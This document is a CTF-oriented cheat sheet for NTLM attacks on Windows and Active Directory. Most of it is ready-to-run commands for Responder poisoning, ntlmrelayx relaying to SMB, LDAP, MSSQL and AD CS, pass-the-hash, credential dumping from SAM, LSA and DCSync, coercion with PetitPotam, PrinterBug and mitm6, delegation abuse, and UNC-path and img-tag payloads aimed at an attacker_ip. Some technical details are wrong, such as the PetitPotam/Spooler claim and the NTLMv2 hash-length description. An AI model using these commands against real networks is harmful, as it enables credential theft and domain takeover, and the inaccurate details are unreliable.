> **NTLM (NT LAN Manager)** is a challenge-response authentication protocol used in Windows environments. It's one of the most common attack vectors in CTFs and HTB boxes — from Responder poisoning to relay attacks, pass-the-hash, and Active Directory exploitation. This guide covers everything from capturing hashes to chaining NTLM relay with AD CS for full domain compromise.

---

## Quickstart — The NTLM Attack Chain

```bash
# The 3-step NTLM relay workflow (the most common CTF scenario):
# 1. Capture NTLMv2 hash via Responder
responder -I tun0

# 2. Relay captured hash to target with ntlmrelayx
impacket-ntlmrelayx -t 10.10.10.10 -smb2support

# 3. Crack the captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

> ⚠️ **NTLMv1 vs NTLMv2:** NTLMv1 is cryptographically broken and trivially crackable. NTLMv2 is the modern standard. Most CTF boxes enforce NTLMv2 — but relay attacks work against both.

---

## NTLM Authentication — How It Works

The NTLM challenge-response protocol has 3 steps:

| Step | Direction | What happens |
| :--- | :-------- | :----------- |
| **1. Negotiate** | Client → Server | Client sends its username and domain |
| **2. Challenge** | Server → Client | Server sends an 8-byte random challenge |
| **3. Authenticate** | Client → Server | Client computes HMAC-MD5 response using its NT hash + challenge, sends it back |

> 💡 **Key insight:** The server never sees the plaintext password — only the challenge-response. But an attacker can **relay** this response to another server or **crack** it offline.

### NTLMv1 vs NTLMv2

| Feature | NTLMv1 | NTLMv2 |
| :------ | :----- | :----- |
| Hash format | 32 chars (128-bit) | 64 chars (256-bit HMAC) |
| Cryptographic strength | Broken (DES-based) | HMAC-MD5 (stronger) |
| Challenge | 8-byte | 8-byte + 8-byte client nonce |
| Cracking speed | Instant | Minutes to hours |
| Hashcat mode | `-m 5500` | `-m 5600` |
| CTF prevalence | Rare (deprecated) | **The standard** |

---

## Responder — The Hash Capture Tool

Responder poisons LLMNR, NBT-NS, and mDNS broadcast protocols to capture NTLM hashes when a client tries to resolve a non-existent hostname.

### Basic Usage

```bash
# Start Responder on your VPN interface
$ sudo responder -I tun0

# Analyze mode (passive — no poisoning, just monitor)
$ sudo responder -I tun0 --analyze

# Verbose mode (see everything happening)
$ sudo responder -I tun0 -v
```

### Responder Configuration (`/etc/responder/Responder.conf`)

```ini
[Responder Core]
; SMB — set to Off when using with ntlmrelayx (ntlmrelayx handles SMB)
SMB = On
; HTTP — set to Off when using with ntlmrelayx
HTTP = On
; SQL Server — capture MSSQL NTLM hashes
SQL = On
; FTP
FTP = On
; POP3 / IMAP / SMTP — email protocol poisoning
POP3 = On
IMAP = On
SMTP = On
; DNS — spoof DNS responses
DNS = On
; LDAP
LDAP = On
```

> ⚠️ **When using ntlmrelayx:** Set `SMB = Off` and `HTTP = Off` in Responder.conf to avoid conflicts. ntlmrelayx needs those ports for relaying.

### Responder with ntlmrelayx — The Relay Workflow

```bash
# Step 1: Create a targets file (one IP per line)
$ cat targets.txt
10.10.10.10
10.10.10.11
10.10.10.12

# Step 2: Start ntlmrelayx (listens for relayed connections)
$ sudo impacket-ntlmrelayx -tf targets.txt -smb2support

# Step 3: Start Responder (poisons network to capture hashes)
$ sudo responder -I tun0

# Step 4: Wait for a victim to trigger name resolution
# ntlmrelayx will relay the captured NTLM auth to the target
```

### Responder — Common CTF Scenarios

```bash
# Scenario 1: Capture and crack NTLMv2 hash
$ sudo responder -I tun0
# Output shows: [NTLMv2]     : user@DOMAIN:1122334455667788:longhash...
# Copy the hash to a file and crack it:
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Scenario 2: Relay to SMB for command execution
$ sudo responder -I tun0    # (SMB=Off, HTTP=Off in config)
$ sudo impacket-ntlmrelayx -t 10.10.10.10 -smb2support -i  # interactive SMB shell

# Scenario 3: Relay to LDAP for AD modification
$ sudo impacket-ntlmrelayx -t ldap://10.10.10.10 --escalate-user regularuser

# Scenario 4: Relay to MSSQL for command execution
$ sudo impacket-ntlmrelayx -t 10.10.10.10 -mssql-query "SELECT @@SERVERNAME"
```

---

## Hash Cracking — Offline Attacks

### Hashcat Modes

```bash
# NTLMv1 (mode 5500) — extremely fast
$ hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt

# NTLMv2 (mode 5600) — the standard
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# With mask attack (8-char password, lowercase + digits)
$ hashcat -m 5600 hash.txt -a 3 ?l?l?l?l?l?l?d?d
```

### John the Ripper

```bash
# NTLMv1
$ john --format=netntlm hash.txt

# NTLMv2
$ john --format=netntlmv2 hash.txt

# With wordlist
$ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Hash Format (NTLMv2)

```
username::domain:ServerChallenge:NTProofStr:NTResponse
```

Example:
```
admin::WORKGROUP:1122334455667788:a3b4c5d6e7f8091a2b3c4d5e6f708192:0101000000000000...
```

---

## Pass-the-Hash (PtH) — Use Known Hashes

When you already have an NTLM hash, use it directly without cracking.

### Impacket Pass-the-Hash

```bash
# PsExec — full interactive shell (requires admin + SMB)
$ impacket-psexec 'DOMAIN/user:password@10.10.10.10'
$ impacket-psexec 'DOMAIN/user@10.10.10.10' -hashes :NT_HASH

# WMIExec — semi-interactive shell (more stealthy)
$ impacket-wmiexec 'DOMAIN/user:password@10.10.10.10'
$ impacket-wmiexec 'DOMAIN/user@10.10.10.10' -hashes :NT_HASH

# SMBExec — file access + command execution
$ impacket-smbexec 'DOMAIN/user:password@10.10.10.10'
$ impacket-smbexec 'DOMAIN/user@10.10.10.10' -hashes :NT_HASH

# AtExec — execute commands via Task Scheduler
$ impacket-atexec 'DOMAIN/user:password@10.10.10.10' "whoami"
$ impacket-atexec 'DOMAIN/user@10.10.10.10' -hashes :NT_HASH "whoami"

# SecretsDump — dump all credentials from a machine
$ impacket-secretsdump 'DOMAIN/user:password@10.10.10.10'
$ impacket-secretsdump 'DOMAIN/user@10.10.10.10' -hashes :NT_HASH
```

### CrackMapExec / NetExec Pass-the-Hash

```bash
# Test SMB with hash
$ netexec smb 10.10.10.10 -u user -H 'NT_HASH'

# Execute command
$ netexec smb 10.10.10.10 -u user -H 'NT_HASH' --exec-method smbexec "whoami"

# Dump SAM
$ netexec smb 10.10.10.10 -u user -H 'NT_HASH' --sam

# Dump LSASS
$ netexec smb 10.10.10.10 -u user -H 'NT_HASH' --lsa
```

---

## NTLM Relay Attacks — Deep Dive

### What Can You Relay To?

| Target | Protocol | Capability |
| :----- | :------- | :--------- |
| **SMB** | SMB | Command execution (if SMB signing disabled) |
| **LDAP** | LDAP | Add computers, modify ACLs, RBCD |
| **MSSQL** | TDS | Query database, execute commands |
| **HTTP** | HTTP | AD CS enrollment (ESC8), Exchange |
| **WinRM** | WS-MAN | Interactive shell |

### NTLM Relay to SMB — Command Execution

```bash
# Relay NTLM auth to SMB target (requires SMB signing disabled)
$ sudo impacket-ntlmrelayx -t 10.10.10.10 -smb2support -i

# Interactive SMB shell — once relay succeeds:
# ls
# put shell.exe
# shell.exe
```

### NTLM Relay to LDAP — AD Modification

```bash
# Relay to LDAP for ACL modification
$ sudo impacket-ntlmrelayx -t ldap://dc01.lab.local --escalate-user regularuser

# This grants regularuser DCSync rights, then you can:
$ impacket-secretsdump 'DOMAIN/regularuser:password@dc01.lab.local'
```

### NTLM Relay to AD CS — Certificate Enrollment (ESC8)

```bash
# Relay NTLM to AD CS web enrollment endpoint
$ sudo impacket-ntlmrelayx -t http://ca01.lab.local/certsrv/certfnsh.asp \
    -smb2support --adcs --template Machine

# When victim authenticates, you get a certificate
# Use the certificate to get a TGT:
$ impacket-getTGT 'lab.local/$(hostname)$' -certfile /tmp/pfx -pfxpass ''
```

### NTLM Relay to MSSQL

```bash
# Relay to MSSQL for queries
$ sudo impacket-ntlmrelayx -t 10.10.10.10 -mssql-query "SELECT @@SERVERNAME"

# Relay for OS shell (requires sysadmin)
$ sudo impacket-ntlmrelayx -t 10.10.10.10 -mssql-shell
```

### ntlmrelayx Advanced Flags

| Flag | Purpose |
| :--- | :------ |
| `-t <target>` | Target to relay to |
| `-tf <file>` | File with multiple targets (round-robin relay) |
| `-smb2support` | Force SMB2 support |
| `-i` | Interactive SMB shell after relay |
| `-socks` | Create SOCKS proxy (keep sessions alive) |
| `--adcs` | Target AD CS web enrollment |
| `--template <name>` | AD CS template to request |
| `-mssql-query` | Execute SQL query via MSSQL relay |
| `-mssql-shell` | Interactive MSSQL shell |
| `--escalate-user` | Escalate a regular user to admin via LDAP |
| `-l <file>` | Output file for captured data |

### SOCKS Proxy Mode

```bash
# Start relay with SOCKS proxy
$ sudo impacket-ntlmrelayx -tf targets.txt -socks -smb2support

# When a victim authenticates, the session is stored
# Use proxychains to access the relayed session
$ proxychains impacket-psexec 'DOMAIN/user@10.10.10.10' -hashes :NT_HASH
```

---

## Forced Authentication — Coercion Attacks

These techniques force a target to authenticate to your machine, allowing you to relay the NTLM challenge-response.

### PrinterBug / SpoolSample

```bash
# Force a target to authenticate via the Spooler service
$ python3 printerbug.py 'DOMAIN/user:password@target_ip' @attacker_ip

# Chain with ntlmrelayx for RCE
$ sudo impacket-ntlmrelayx -t 10.10.10.10 -smb2support -i
$ python3 printerbug.py 'DOMAIN/user:password@target_ip' @attacker_ip
```

### PetitPotam

```bash
# Force DC to authenticate via LSARPC
$ python3 PetitPotam.py @attacker_ip @dc_ip

# Chain with ntlmrelayx for RCE on DC
$ sudo impacket-ntlmrelayx -t 10.10.10.10 -smb2support -i
$ python3 PetitPotam.py @attacker_ip @dc_ip
```

### DFSCoerce

```bash
# Force authentication via DFS RPC
$ python3 dfocoerce.py @attacker_ip @dc_ip
```

### mitm6 — IPv6-Based NTLM Capture

```bash
# Act as DHCPv6 server to poison DNS queries
$ sudo mitm6 -d lab.local

# Chain with ntlmrelayx for AD CS relay
$ sudo impacket-ntlmrelayx -t http://ca01.lab.local/certsrv/certfnsh.asp \
    -smb2support --adcs --template Machine
```

---

## NTLM in Web Applications

### Detecting NTLM Auth

```bash
# NTLM auth in HTTP headers
$ curl -v http://10.10.10.10/
# Look for: WWW-Authenticate: NTLM

# Force NTLM auth via curl
$ curl --ntlm user:password http://10.10.10.10/

# NTLM over HTTP proxy
$ curl -x http://proxy:8080 --proxy-ntlm user:pass http://target
```

### Forcing NTLM via UNC Paths

```bash
# Inject UNC path to force NTLM authentication
# In a document, email, or web page:
file:///\\attacker_ip\share\file.txt
\\attacker_ip\share\file.txt
http://attacker_ip/file.txt?param=\\attacker_ip\share

# In a .lnk shortcut file — point to \\attacker_ip\share
# In an image tag in HTML:
<img src="file:///\\attacker_ip\share\image.png">

# In an email — embed image with UNC source
```

---

## NTLM Relay — Bypasses & Filtering

### SMB Signing Detection

```bash
# Check if SMB signing is required on target
$ nmap --script smb2-security-mode -p 445 10.10.10.10

# Using crackmapexec/netexec
$ netexec smb 10.10.10.10 --gen-relay-list targets.txt
# Output: IPs without SMB signing = relay targets

# Using nmap NSE script
$ nmap --script smb-security-mode -p 445 10.10.10.10
```

### Common Relay Targets (No SMB Signing)

| Target Type | SMB Signing | Relayable |
| :---------- | :---------: | :-------: |
| **Windows Workstations** | ❌ Disabled by default | ✅ Yes |
| **Windows Servers** | ✅ Required | ❌ No |
| **Domain Controllers** | ✅ Required | ❌ No |
| **Linux (Samba)** | ❌ Disabled by default | ✅ Yes |

> 💡 **Key fact:** SMB signing is disabled by default on Windows workstations and Linux/Samba. Only servers and DCs enforce it.

---

## NTLM Downgrade Attacks

```bash
# Force NTLMv1 response (extremely fast to crack)
# Use Responder with specific options or custom scripts

# Detect NTLMv1 in captured hashes
# NTLMv1 hash length: 48 hex chars after the last colon
# NTLMv2 hash length: much longer (128+ hex chars)
```

---

## Delegation Attacks — Advanced AD Exploitation

### Unconstrained Delegation

```bash
# If a server has Unconstrained Delegation and a domain admin connects:
# 1. Monitor for TGTs with Rubeus on the compromised server
$ .\Rubeus.exe monitor /interval:5 /nowrap

# 2. Force DC to authenticate (PetitPotam, PrinterBug)
$ python3 PetitPotam.py @attacker_ip @dc_ip

# 3. Capture the DC's TGT from Rubeus output
# 4. Use the TGT for pass-the-ticket
$ impacket-psexec 'DOMAIN/DC$@dc_ip' -k -no-pass
```

### Constrained Delegation

```bash
# If you control an account with Constrained Delegation to a target:
$ impacket-getST -spn cifs/target.lab.local 'DOMAIN/user:password' -impersonate administrator

# Use the ticket
$ export KRB5CCNAME=administrator@cifs_target.lab.local@LAB.LOCAL.ccache
$ impacket-psexec 'DOMAIN/administrator@target.lab.local' -k -no-pass
```

### Resource-Based Constrained Delegation (RBCD)

```bash
# Prerequisite: You need GenericAll or GenericWrite on the target computer object

# 1. Create a new machine account (if you have MAQ)
$ impacket-addcomputer 'DOMAIN/user:password' -computer-name 'FAKE01$' -computer-pass 'Password123'

# 2. Set RBCD attribute on target
$ impacket-rbcd 'DOMAIN/user:password' -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write

# 3. Get a ticket as administrator
$ impacket-getST -spn cifs/target.lab.local 'DOMAIN/FAKE01$:Password123' -impersonate administrator

# 4. Use the ticket
$ export KRB5CCNAME=administrator@cifs_target.lab.local@LAB.LOCAL.ccache
$ impacket-psexec 'DOMAIN/administrator@target.lab.local' -k -no-pass
```

---

## NTLM Relay to LDAP — ACL Attacks

```bash
# Step 1: Relay NTLM to LDAP and add DCSync rights
$ sudo impacket-ntlmrelayx -t ldap://dc01.lab.local \
    --escalate-user regularuser

# Step 2: When victim authenticates, regularuser gets DCSync rights

# Step 3: Dump all hashes
$ impacket-secretsdump 'DOMAIN/regularuser:password@dc01.lab.local'

# Step 4: Use DCSync hash for Golden Ticket or PtH
$ impacket-psexec 'DOMAIN/administrator@dc01.lab.local' \
    -hashes aad3b435b51404eeaad3b435b51404ee:HASH_HERE
```

### RBCD via LDAP Relay

```bash
# Relay NTLM to LDAP and set RBCD on target machine
$ sudo impacket-ntlmrelayx -t ldap://dc01.lab.local \
    --add-computer FAKE01 --delegate-to TARGET$

# Then use getST + pass-the-ticket as in the RBCD section above
```

---

## Tools Cheat Sheet

| Tool | Purpose | Install |
| :--- | :------ | :------ |
| **Responder** | Poison LLMNR/NBT-NS/mDNS, capture NTLM hashes | `sudo apt install responder` |
| **Impacket** | ntlmrelayx, psexec, wmiexec, secretsdump, etc. | `pip install impacket` |
| **NetExec** | SMB/LDAP enumeration, relay target scanning | `pip install netexec` |
| **Hashcat** | Offline hash cracking | `sudo apt install hashcat` |
| **John the Ripper** | Offline hash cracking | `sudo apt install john` |
| **mitm6** | IPv6-based NTLM coercion | `pip install mitm6` |
| **PetitPotam** | Force DC authentication via LSARPC | `git clone https://github.com/topotam/PetitPotam` |
| **Certipy** | AD CS exploitation | `pip install certipy-ad` |

---

## CTF / HTB NTLM Workflow Checklist

1. **Identify NTLM auth** — check for `WWW-Authenticate: NTLM` in HTTP headers, or capture via Responder
2. **Capture hash** — run `responder -I tun0` and wait for LLMNR/NBT-NS broadcasts
3. **Crack or Relay**:
   - If hash is captured → crack with hashcat (`-m 5600`)
   - If relay is possible → use ntlmrelayx to relay to SMB/LDAP/MSSQL/ADCS
4. **Coerce authentication** — if no broadcasts, use PetitPotam/PrinterBug/mitm6 to force NTLM
5. **Relay to target** — relay to LDAP for AD modification or AD CS for certificate enrollment
6. **Escalate** — use certificates, DCSync, or RBCD to gain domain admin
7. **Pivot** — use pass-the-hash or pass-the-ticket for lateral movement
8. **Extract secrets** — run `secretsdump.py` for SAM, LSA, cached credentials

---

## Troubleshooting

| Issue | Cause | Fix |
| :---- | :---- | :-- |
| Responder captures nothing | LLMNR/NBT-NS disabled | Try mitm6 (IPv6), or coerce with PetitPotam |
| ntlmrelayx shows "SMB signing required" | Target enforces SMB signing | Relay to LDAP or HTTP instead of SMB |
| Hash cracks instantly | NTLMv1 hash | Force NTLMv2 for better security |
| Relay to LDAP fails | LDAP signing required | Try HTTP relay (AD CS ESC8) |
| No SOCKS sessions appear | Victim hasn't authenticated yet | Trigger coercion with PetitPotam/PrinterBug |
| "STATUS_ACCESS_DENIED" on relay | Target doesn't accept anonymous LDAP | Try different target or relay to AD CS |
| Responder conflicts with ntlmrelayx | SMB/HTTP servers still active in Responder | Set `SMB = Off` and `HTTP = Off` in Responder.conf |
| "STATUS_LOGON_FAILURE" on relay | Target rejected the credentials | Verify target is domain-joined and accepts NTLM |
| mitm6 captures nothing | Machine not on same subnet (Layer 2) | mitm6 requires broadcast domain adjacency — use Responder instead |
| PetitPotam fails | Spooler service disabled on target | Try DFSCoerce or PrinterBug as alternatives |
| Relay succeeds but no shell | ntlmrelayx interactive mode not set | Add `-i` flag to ntlmrelayx for interactive SMB shell |

---

## References

- [The Hacker Recipes — NTLM Relay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
- [HackTricks — NTLM Relay](https://book.hacktricks.xyz/network-services-pentesting/ntlm-relay)
- [Impacket Documentation](https://github.com/fortra/impacket)
- [Responder GitHub](https://github.com/lgandx/Responder)
- [PetitPotam](https://github.com/topotam/PetitPotam)
- [Certipy — AD CS Attacks](https://github.com/ly4k/Certipy)
- [NetExec Wiki](https://www.netexec.wiki/)
- [PortSwigger — NTLM](https://portswigger.net/web-security/ntlm)

---

## Installing Tools

```bash
# Impacket (ntlmrelayx, psexec, wmiexec, secretsdump, etc.)
$ pip install impacket                     # pip (any distro)
$ sudo apt install python3-impacket        # Debian/Kali
$ sudo pacman -S impacket                  # Arch

# Responder — NTLM hash capture
$ sudo apt install responder               # Debian/Kali
$ git clone https://github.com/lgandx/Responder

# NetExec (formerly CrackMapExec)
$ pip install netexec                      # pip
$ sudo apt install netexec                 # Debian/Kali

# Hashcat — offline hash cracking
$ sudo apt install hashcat                 # Debian/Kali
$ sudo pacman -S hashcat                   # Arch

# John the Ripper
$ sudo apt install john                    # Debian/Kali
$ sudo pacman -S john                      # Arch

# mitm6 — IPv6 NTLM coercion
$ pip install mitm6

# PetitPotam — DC authentication coercion
$ git clone https://github.com/topotam/PetitPotam

# Certipy — AD CS exploitation
$ pip install certipy-ad
```
